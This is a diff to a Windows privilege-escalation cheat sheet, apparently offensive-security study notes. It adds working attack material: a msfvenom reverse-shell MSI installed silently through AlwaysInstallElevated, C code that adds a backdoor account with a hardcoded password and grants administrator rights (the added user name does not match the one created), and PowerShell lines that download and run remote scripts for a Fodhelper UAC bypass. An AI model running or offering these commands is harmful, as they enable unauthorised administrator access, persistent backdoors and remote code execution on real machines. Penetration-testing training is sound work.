@@ -640,12 +640,93 @@ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 ```
 
-### Manual Method
+### Manual Method 1 (Simple)
 
 ```powershell
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
 ```
+
+### OR METHOD 2: [Custom MSI (Complex)](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md#manual-exploitation)
+
+Open an existing random project in Visual Studio 2022-> go to Extensions tab -> Manage extensions
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Install "Microsoft Visual Studio Installer Projects 2022" --> Restart VS to complete the installation
+
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Create a adduser.c file
+
+```c
+int main ()
+{
+	int i;
+	i = system ("net user bill P@ssw0rd123! /add");
+	i = system("net localgroup administrators user /add");
+	return 0;
+}
+```
+
+Compile it&#x20;
+
+```bash
+i686-w64-mingw32-gcc adduser.c -o adduser.exe
+```
+
+<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
+
+Right click "always\_install\_elevated\_add\_bill" --> Properties
+
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+
+Change TargetPlatform to x64
+
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+
+Right click "always\_install\_elevated\_add\_bill" --> View --> Custom Actions
+
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+
+Right-click "Custom Actions" --> Add Custom Action
+
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+
+Double-click into "Application Folder"
+
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+
+Select "adduser.exe" --> OK
+
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+Change Run64Bit option in Properties Window to True:
+
+<figure><img src="../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+
+Change build to release && build it with Cltrl-shift-b
+
+<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+
+```powershell
+curl.exe http://192.168.45.218/always_install_elevated_add_bill.msi -o always_install_elevated_add_bill.msi
+msiexec /quiet /qn /i always_install_elevated_add_bill.msi
+```
+
+<figure><img src="../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
 
 ### OR USING METASPLOIT
 
@@ -811,8 +892,12 @@ Invoke-EventViewer c:\temp\reverse.exe
 
 OR using [FodhelperBypass.ps1](https://raw.githubusercontent.com/winscripting/UAC-bypass/refs/heads/master/FodhelperBypass.ps1)
 
-```
-iex (new-object net.webclient).downloadstring('http://192.168.45.160/FodhelperBypass.ps1')
+```powershell
+# Load PowerView in memory
+iex (new-object net.webclient).downloadstring('http://192.168.45.218/FodhelperBypass.ps1')
+
+# Using ps_shellcode_runner
+FodhelperBypass -program "powershell -c iex (new-object net.webclient).downloadstring('http://192.168.45.218/runall.ps1')"
 ```
 
 </details>
@@ -1055,7 +1140,7 @@ x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
 
 In CLIENT01 process monitor:
 
-![](<../.gitbook/assets/image (5) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1).png>)
 
 * Create malicious msasn1.dll & save to C:\Program Files\FileZilla Server --> Rev shell
   * ```powershell
@@ -1066,7 +1151,7 @@ In CLIENT01 process monitor:
     ```
     *
 
-        <figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+        <figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
   * Start Filezilla server
